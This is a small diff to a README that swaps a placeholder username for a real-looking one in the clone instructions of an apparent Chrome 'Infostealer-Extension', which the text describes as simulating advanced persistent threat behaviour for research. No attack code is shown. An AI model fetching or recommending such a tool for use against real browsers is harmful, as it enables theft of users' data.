@@ -36,7 +36,7 @@ This Chrome extension simulates advanced persistent threat (APT) behavior for re
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/yourusername/Infostealer-Extension.git
+   git clone https://github.com/0xFFF-cmd/Infostealer-Extension.git
    cd Infostealer-Extension
    ```
 
